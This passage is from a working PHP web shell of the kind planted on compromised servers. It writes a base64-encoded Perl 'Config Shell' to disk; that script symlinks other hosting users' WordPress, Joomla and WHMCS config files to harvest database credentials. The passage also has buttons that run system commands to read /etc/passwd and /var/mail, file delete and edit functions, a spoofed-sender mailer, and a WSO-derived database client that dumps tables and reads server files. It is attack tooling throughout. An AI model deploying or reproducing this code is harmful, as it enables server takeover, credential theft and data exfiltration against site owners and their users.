2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNS50eHQnKTsNCgkJc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG02LnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTcudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTgudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTkudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRrb2xhLid+fjUudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGtvbGEuJ35+NC50eHQnKTsNCgkJc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRrb2xhLid+fmludmlzaW8udHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZS9kYi5waHAnLCRrb2xhLid+fjcudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29ubmVjdC5waHAnLCRrb2xhLid+fjgudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRrb2xhLid+fm1rLXBvcnRhbGUxLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvY29uZmlnLnBocCcsJGtvbGEuJ35+MTIudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2V0dGluZ3MucGhwJywka29sYS4nfn5TbWYudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGtvbGEuJ35+cGhwYmIzLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29sYS4nfn5pbmZpbml0eS50eHQnKTsNCgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW4xLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+fnZCdWxsZXRpbjIudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluMy50eHQnKTsNCgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jYy9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW40LnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRrb2xhLid+flBocGJiMS50eHQnKTsNCgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn5QaHBiYjIudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGtvbGEuJ35+V29yZHByZXNzMS50eHQnKTsNCgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLid+fldvcmRwcmVzczIudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fkpvb21sYTEudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+Sm9vbWxhMi50eHQnKTsNCgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fkpvb21sYTMudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG0xLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTIudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htMy50eHQnKTsNCgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTQudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTUudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNi50eHQnKTsNCgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG03LnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG04LnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG05LnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywka29sYS4nfn41LnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRrb2xhLid+fjQudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywka29sYS4nfn5pbnZpc2lvLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29sYS4nfn43LnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2Nvbm5lY3QucGhwJywka29sYS4nfn44LnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywka29sYS4nfn5tay1wb3J0YWxlMS50eHQnKTsNCgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2NvbmZpZy5waHAnLCRrb2xhLid+fjEyLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3NldHRpbmdzLnBocCcsJGtvbGEuJ35+U21mLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRrb2xhLid+fnBocGJiMy50eHQnKTsNCgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJGtvbGEuJ35+aW5maW5pdHkudHh0Jyk7DQp9DQppZiAoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAnUE9TVCcpIHsNCiAgcmVhZChTVERJTiwgJGJ1ZmZlciwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQp9IGVsc2Ugew0KICAkYnVmZmVyID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQp9DQpAcGFpcnMgPSBzcGxpdCgvJi8sICRidWZmZXIpOw0KZm9yZWFjaCAkcGFpciAoQHBhaXJzKSB7DQogICgkbmFtZSwgJHZhbHVlKSA9IHNwbGl0KC89LywgJHBhaXIpOw0KICAkbmFtZSA9fiB0ci8rLyAvOw0KICAkbmFtZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkdmFsdWUgPX4gdHIvKy8gLzsNCiAgJHZhbHVlID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICRGT1JNeyRuYW1lfSA9ICR2YWx1ZTsNCn0NCmlmICgkRk9STXtwYXNzfSBlcSAiIil7DQpwcmludCAnDQo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIiBiZ2NvbG9yPSIjMDAwMDAwIj4NCjxwPkNvbmZpZyBTaDNsbDwvcD4NCjxwPjxmb250IGNvbG9yPSIjQzBDMEMwIj5bPC9mb250PiBEZXZsb3AgQnkgTVIuRlJJRVpBIDxmb250IGNvbG9yPSIjQzBDMEMwIj48L2ZvbnQ+IA0KPHNwYW4gaWQ9InJlc3VsdF9ib3giIGNsYXNzPSJzaG9ydF90ZXh0IiBsYW5nPSJlbiI+PHNwYW4gc3R5bGUgdGl0bGU+DQoNCjxmb3JtIG1ldGhvZD0icG9zdCI+DQo8dGV4dGFyZWEgbmFtZT0icGFzcyIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICMwMEZGRkY7IHdpZHRoOiA1NDNweDsgaGVpZ2h0OiA0MjBweDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9yOiMwMEZGRkYiICA+PC90ZXh0YXJlYT48YnIgLz4NCiZuYnNwOzxwPg0KPGlucHV0IG5hbWU9InRhciIgdHlwZT0idGV4dCIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICMwMEZGRkY7IHdpZHRoOiAyMTJweDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9yOiMwMEZGRkY7ICIgIC8+PGJyIC8+DQombmJzcDs8L3A+DQo8cD4NCjxpbnB1dCBuYW1lPSJTdWJtaXQxIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHZXQgQ29uZmlnIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgIzAwRkZGRjsgd2lkdGg6IDk5OyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZToxMHB0OyBjb2xvcjojMDBGRkZGOyB0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7IGhlaWdodDoyMzsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDIiAvPjwvcD4NCjwvZm9ybT4nOw0KfWVsc2V7DQpAbGluZXMgPTwkRk9STXtwYXNzfT47DQokeSA9IEBsaW5lczsNCm9wZW4gKE1ZRklMRSwgIj50YXIudG1wIik7DQpwcmludCBNWUZJTEUgInRhciAtY3pmICIuJEZPUk17dGFyfS4iLnRhciAiOw0KZm9yICgka2E9MDska2E8JHk7JGthKyspew0Kd2hpbGUoQGxpbmVzWyRrYV0gID1+IG0vKC4qPyk6eDovZyl7DQombGlsKCQxKTsNCnByaW50IE1ZRklMRSAkMS4iLnR4dCAiOw0KZm9yKCRrZD0xOyRrZDwxODska2QrKyl7DQpwcmludCBNWUZJTEUgJDEuJGtkLiIudHh0ICI7DQp9DQp9DQogfQ0KcHJpbnQnPGJvZHkgY2xhc3M9Im5ld1N0eWxlMSIgYmdjb2xvcj0iIzAwMDAwMCI+DQo8cD5Eb25lICEhPC9wPg0KPHA+Jm5ic3A7PC9wPic7DQppZigkRk9STXt0YXJ9IG5lICIiKXsNCm9wZW4oSU5GTywgInRhci50bXAiKTsNCkBsaW5lcyA9PElORk8+IDsNCmNsb3NlKElORk8pOw0Kc3lzdGVtKEBsaW5lcyk7DQpwcmludCc8cD48YSBocmVmPSInLiRGT1JNe3Rhcn0uJy50YXIiPjxmb250IGNvbG9yPSIjMDBGRjAwIj4NCjxzcGFuIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmUiPkNsaWNrIEhlcmUgVG8gRG93bmxvYWQgVGFyIEZpbGU8L3NwYW4+PC9mb250PjwvYT48L3A+JzsNCn0NCn0NCiBwcmludCINCjwvYm9keT4NCjwvaHRtbD4iOw==';

$file = fopen("config.izo" ,"w+");
$write = fwrite ($file ,base64_decode($configshell));
fclose($file);
    chmod("config.izo",0755);
   echo "</br><a href='configsh3ll/config.izo' target='_blank'> config_Shell</a>";
   echo "<iframe src=configsh3ll/config.izo width=100% height=40% ></iframe> ";
	
            
            break;
            case'byp':
            
            echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Users <br>';
echo '
<div class="tul"><font color="ee5500" face="Tahoma, Geneva, sans-serif" style="font-size: 8pt">

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with awk program
<form method="post">
<input type="submit" value="Bypass" name="awk">
</form>
</center><br>
</p>



<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with System Function
<form method="post">
<input type="submit" value="Bypass" name="syst">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with Passthru Function
<form method="post">
<input type="submit" value="Bypass" name="passth">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with exec Function
<form method="post">
<input type="submit" value="Bypass" name="ex">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with shell_exec Function
<form method="post">
<input type="submit" value="Bypass" name="shex">
</form>
</center><br>
</p><center>';
    

//Awk Program //
if ($_POST['awk']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
echo "
<br>
<b>
</b>
<br>
";
}
echo "</center><center>";
    
//System Function //
if ($_POST['syst']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
echo "
<br>
<b>
</b>
<br>
";
}

echo "</center><center>";
    
//Passthru Function //
if ($_POST['passth']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
echo "
<br>
<b>
</b>
<br>
";
}
echo "</center><center>";
    
//exec Function //
if ($_POST['ex']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
echo "
<br>
<b>

</b>
<br>
";
}

echo "</center><center>";
    
//exec Function //
if ($_POST['shex']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
echo "
<br>
<b>
</b>
<br>
";
}

            
            break;
	case'delete':
	$file = $_GET['file'];
	if(is_dir($_GET['file'])){
		if(rmdir($file)){
			
			echo'Dir Deleted!!!';
					echo'<a href=?dir='.$_GET['dir'].'>[Back]</a>';
		
	}else{
		echo'Cannot Deleted The Dir!!!!';
					echo'<a href=?dir='.$_GET['dir'].'>[Back]</a>';

		}
	
	}
	if(is_file($_GET['file'])){
		if(unlink($file)){
			
			echo''.$file.' Deleted!!';
								echo'<a href=?dir='.$_GET['dir'].'>[Back]</a>';

			
		}else{
			
			echo''.$file.' Cannot Deleted';
								echo'<a href=?dir='.$_GET['dir'].'>[Back]</a>';

		}
	}
	break;	
	case'view':
	fileinfo();
	echo "<div class=\"viewfile\">";
		$file = wordwrap(@file_get_contents($_GET['file']),"240","\n");
		@highlight_string($file);
		echo "</div>";
	break;
	case'edit':
	fileinfo();
	if(is_writable($_GET['file'])){
	if(isset($_POST['editform']))
                {
                    $f = $_GET['file'];
                    $fh = fopen($f, 'w') or print "Error while opening file!";
                    fwrite($fh, $_POST['editform']) or print "Couldn't save file!";
                    fclose($fh);
                }
                
                print "<br>Editing file <b>".$_GET['file']."</b> (".perms($_GET['file']).")<br><br><form action=\"".$me."?fr=edit&file=".$_GET['file']."&dir=".realpath('.')."\" method=POST><textarea cols=90 rows=15 name=\"editform\">";
                
                if(file_exists($_GET['file']))
                {
                    $rd = file($_GET['file']);
                    foreach($rd as $l)
                    {
                        print htmlspecialchars($l);
                    }
                }
                
                print "</textarea><input type=submit value=\"Save\"></form>";}else{
					
					echo'The file Is Not Writable';
					
				}
                
	break;
	case'mail':
	
	if(isset($_POST['mail_send'])){
	$mail_to = $_POST['mail_to'];
	$mail_from = $_POST['mail_from'];
	$mail_subject = $_POST['mail_subject'];
	$mail_content = magicboom($_POST['mail_content']);
	if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from")){
		$msg = "email sent to $mail_to";
	}
	else $msg = "send email failed";
}

echo'<form method="post" action=?dir='.realpath('.').'&amp;fr=mail>
<table class="cmdbox">
<tr><td>
<textarea class="output" name="mail_content" id="cmd" style="height:340px;">Hey there, please patch me ;)</textarea>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="admin@somesome.com" name="mail_to" />&nbsp; mail to</td></tr>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="frieza@frieza.gov" name="mail_from" />&nbsp; from</td></tr>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="patch me" name="mail_subject" />&nbsp; subject</td></tr>
<tr><td>&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="mail_send" /></td></tr></form>
<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;'.$msg.'></td></tr>
</table>
</form>';

 
	break;
  case'mysql':
  #!From Wso Sh3ll
  echo "<script>     var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
  
       var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."'; 
           var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."'; 
               var d = document; 	function set(a,c,p1,p2,p3,charset) { 		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
                		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
                		 		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_; 		
                	if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_; 
                			if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
                			 		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_; 	}
                			 		
                			 		
                			 		 	function g(a,c,p1,p2,p3,charset) { 		
                			 		 	set(a,c,p1,p2,p3,charset); 		d.mf.submit(); 
                			 		 		}
                			 		 	
                			 		 	
                			 		 	  </script>";
                			 		 	  
                			 		 	   	class DbClass { 	
												
													var $type; 		var $link; 		var $res; 		
													
													function DbClass($type)	{ 			
														
														$this->type = $type; 		
														} 		function connect($host, $user, $pass, $dbname){ 
															
																		switch($this->type)	{ 
																			
	case 'mysql':
	if( $this->link = @mysql_connect($host,$user,$pass,true) )
	
	 return true;
	 break;
	 case 'pgsql': 
	 $host = explode(':', $host);
	 if(!$host[1]) $host[1]=5432;
	 if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) 
	 return true; 
	 break;
	 } 			return false; 		} 		
	 
	 
	 
	 
	 function selectdb($db) {
		  switch($this->type)	{
			case 'mysql':
			if (@mysql_select_db($db))return true; break; 			
			} 			return false; 		
			} 		
			
			function query($str) { 
			switch($this->type) {
				case 'mysql': 					
				
				return $this->res = @mysql_query($str); 					
				break; 				
				case 'pgsql': 					
				return $this->res = @pg_query($this->link,$str); 					
				break; 			} 			return false; 		} 		
				function fetch() { 			
					$res = func_num_args()?func_get_arg(0):$this->res; 			
					switch($this->type)	{ 				
						case 'mysql': 					
						return @mysql_fetch_assoc($res); 		
									break; 			
										case 'pgsql': 			
										return @pg_fetch_assoc($res); 					
										break; 			} 			
										return false; 		} 
		function listDbs() { 
			switch($this->type)	{ 
						case 'mysql':
						         return $this->query("SHOW databases"); 		
						         	break; 				
						         	case 'pgsql': 			
						     return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'"); 	
						     			break; 			} 			return false; 		} 		
						     			
						     			
						     			
						     			function listTables() {
											switch($this->type)	{ 				
												
												case 'mysql': 					
												
												return $this->res = $this->query('SHOW TABLES'); 	
															break; 				
															case 'pgsql': 				
	return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'"); 	
				break; 			} 			return false; 		} 		
				
				function error() { 			switch($this->type)	{ 		
							case 'mysql': 				
								return @mysql_error(); 		
										break; 				
										case 'pgsql': 					
										return @pg_last_error(); 				
										break; 			} 			return false; 		} 		
										function setCharset($str) { 			switch($this->type)	{ 			
						case 'mysql': 					
						if(function_exists('mysql_set_charset')) 						return @mysql_set_charset($str, $this->link); 
											else 						$this->query('SET CHARSET '.$str); 				
												break; 			
													case 'pgsql': 				
														return @pg_set_client_encoding($this->link, $str); 			
																break; 			} 			return false; 		} 		
																function loadFile($str) { 			
																	
																	
											switch($this->type)	{ 			
													case 'mysql': 				
														return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file")); 		
																break; 	
												case 'pgsql': 				
													$this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '".addslashes($str)."';select file from wso2;"); 			
															$r=array(); 					while($i=$this->fetch()) 	
																				$r[] = $i['file']; 		
																							$this->query('drop table wso2'); 	
										return array('file'=>implode("\n",$r)); 				break; 			} 			return false; 		} 		
										
										
										
										function dump($table, $fp = false) { 			
											
											switch($this->type)	{ 				
												case 'mysql': 					
												
												$res = $this->query('SHOW CREATE TABLE `'.$table.'`'); 			
														$create = mysql_fetch_array($res); 				
															$sql = $create[1].";\n";                   
															  if($fp) fwrite($fp, $sql); else echo($sql); 		
						$this->query('SELECT * FROM `'.$table.'`');               
						      $head = true; 					
						      while($item = $this->fetch()) { 						$columns = array(); 						
								  foreach($item as $k=>$v) {
									   if($v == null)
									    $item[$k] = "NULL";                          
									       elseif(is_numeric($v))                                 $item[$k] = $v;                             else                                 $item[$k] = "'".@mysql_real_escape_string($v)."'"; 							$columns[] = "`".$k."`"; 
									       						}                         if($head) {                             $sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';                             $head = false;                         } else                             $sql = "\n\t,(".implode(", ", $item).')';                         if($fp) fwrite($fp, $sql); else echo($sql); 					}                     if(!$head)                         if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n"); 				break; 				case 'pgsql': 					$this->query('SELECT * FROM '.$table); 					while($item = $this->fetch()) { 						$columns = array(); 						foreach($item as $k=>$v) { 							$item[$k] = "'".addslashes($v)."'"; 							$columns[] = $k; 						}                         $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";                         if($fp) fwrite($fp, $sql); else echo($sql); 					} 				break; 			} 			return false; 		} 	}; 	$db = new DbClass($_POST['type']); 	if(@$_POST['p2']=='download') { 		$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']); 		$db->selectdb($_POST['sql_base']);         switch($_POST['charset']) {             case "Windows-1251": $db->setCharset('cp1251'); break;             case "UTF-8": $db->setCharset('utf8'); break;             case "KOI8-R": $db->setCharset('koi8r'); break;             case "KOI8-U": $db->setCharset('koi8u'); break;             case "cp866": $db->setCharset('cp866'); break;         }         if(empty($_POST['file'])) {             ob_start("ob_gzhandler", 4096);             header("Content-Disposition: attachment; filename=dump.sql");             header("Content-Type: text/plain");             foreach($_POST['tbl'] as $v) 				$db->dump($v);             exit;         } elseif($fp = @fopen($_POST['file'], 'w')) {             foreach($_POST['tbl'] as $v)                 $db->dump($v, $fp);             fclose($fp);             unset($_POST['p2']);         } else             die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>'); 	}  	echo " <div class=content> <form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr> <td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr> <input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'> <td><select name='type'><option value='mysql' ";     if(@$_POST['type']=='mysql')echo 'selected'; echo ">MySql</option><option value='pgsql' "; if(@$_POST['type']=='pgsql')echo 'selected'; echo ">PostgreSql</option></select></td> <td><input type=text name=sql_host value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'></td> <td><input type=text name=sql_login value='". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."'></td> <td><input type=text name=sql_pass value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>"; 	$tmp = "<input type=text name=sql_base value=''>"; 	if(isset($_POST['sql_host'])){ 		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { 			switch($_POST['charset']) { 				case "Windows-1251": $db->setCharset('cp1251'); break; 				case "UTF-8": $db->setCharset('utf8'); break; 				case "KOI8-R": $db->setCharset('koi8r'); break; 				case "KOI8-U": $db->setCharset('koi8u'); break; 				case "cp866": $db->setCharset('cp866'); break; 			} 			$db->listDbs(); 			echo "<select name=sql_base><option value=''></option>"; 			while($item = $db->fetch()) { 				list($key, $value) = each($item); 				echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>'; 			} 			echo '</select>'; 		} 		else echo $tmp; 	}else 		echo $tmp; 	echo "</td> 				<td><input type=submit value='>>' onclick='fs(d.sf);'></td>                 <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> count the number of rows</td> 			</tr> 		</table> 		<script>             s_db='".@addslashes($_POST['sql_base'])."';             function fs(f) {                 if(f.sql_base.value!=s_db) { f.onsubmit = function() {};                     if(f.p1) f.p1.value='';                     if(f.p2) f.p2.value='';                     if(f.p3) f.p3.value='';                 }             } 			function st(t,l) { 				d.sf.p1.value = 'select'; 				d.sf.p2.value = t;                 if(l && d.sf.p3) d.sf.p3.value = l; 				d.sf.submit(); 			} 			function is() { 				for(i=0;i<d.sf.elements['tbl[]'].length;++i) 					d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked; 			} 		</script>"; 	if(isset($db) && $db->link){ 		echo "<br/><table width=100% cellpadding=2 cellspacing=0>"; 			if(!empty($_POST['sql_base'])){ 				$db->selectdb($_POST['sql_base']); 				echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>"; 				$tbls_res = $db->listTables(); 				while($item = $db->fetch($tbls_res)) { 					list($key, $value) = each($item);                     if(!empty($_POST['sql_count']))                         $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.'')); 					$value = htmlspecialchars($value); 					echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>"; 				} 				echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>"; 				if(@$_POST['p1'] == 'select') { 					$_POST['p1'] = 'query';                     $_POST['p3'] = $_POST['p3']?$_POST['p3']:1; 					$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']); 					$num = $db->fetch(); 					$pages = ceil($num['n'] / 30);                     echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", 